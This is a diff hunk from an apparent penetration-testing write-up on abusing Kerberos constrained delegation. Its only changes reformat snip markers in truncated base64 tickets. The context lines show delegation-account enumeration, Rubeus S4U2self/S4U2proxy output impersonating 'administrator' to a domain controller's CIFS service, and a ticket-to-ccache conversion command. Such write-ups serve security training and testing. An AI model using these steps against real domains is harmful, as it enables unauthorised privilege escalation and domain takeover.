@@ -47,7 +47,7 @@ python3 rubeustoccache.py '<BASE64_TICKET>' '<IMPERSONATE_USER>.kirbi' '<IMPERSO
 ```
 
 ```console {class="sample-code"}
-python3 ~/Tools/RubeusToCcache/rubeustoccache.py 'doIG9DCCBv ...[SNIP]... 9yZS5jb20=' 'administrator.kirbi' 'administrator.ccache'
+python3 ~/Tools/RubeusToCcache/rubeustoccache.py 'doIG9DCCBv ---[SNIP]--- 9yZS5jb20=' 'administrator.kirbi' 'administrator.ccache'
 ╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
 ╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
 ╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
@@ -159,7 +159,7 @@ Get-NetUser -TrustedToAuth
 [+] TGT request successful!
 [*] base64(ticket.kirbi):
 
-      doIFljCCBZKg ...[SNIP]... hPUkUuQ09N
+      doIFljCCBZKg ---[SNIP]--- hPUkUuQ09N
 
 [*] Action: S4U
 
@@ -170,7 +170,7 @@ Get-NetUser -TrustedToAuth
 [*] Got a TGS for 'administrator' to 'MS01$@CLIENT.EXAMPLE.COM'
 [*] base64(ticket.kirbi):
 
-      doIGGjCCBh ...[SNIP]... cbBU1TMDIk
+      doIGGjCCBh ---[SNIP]--- cbBU1TMDIk
 
 [*] Impersonating user 'administrator' to target SPN 'cifs/dc01.client.example.com'
 [*] Building S4U2proxy request for service: 'cifs/dc01.client.example.com'
@@ -179,7 +179,7 @@ Get-NetUser -TrustedToAuth
 [+] S4U2proxy success!
 [*] base64(ticket.kirbi) for SPN 'cifs/dc01.client.example.com':
 
-      doIG9DCCBv ...[SNIP]... 9yZS5jb20=
+      doIG9DCCBv ---[SNIP]--- 9yZS5jb20=
 [+] Ticket successfully imported!
 ```
 
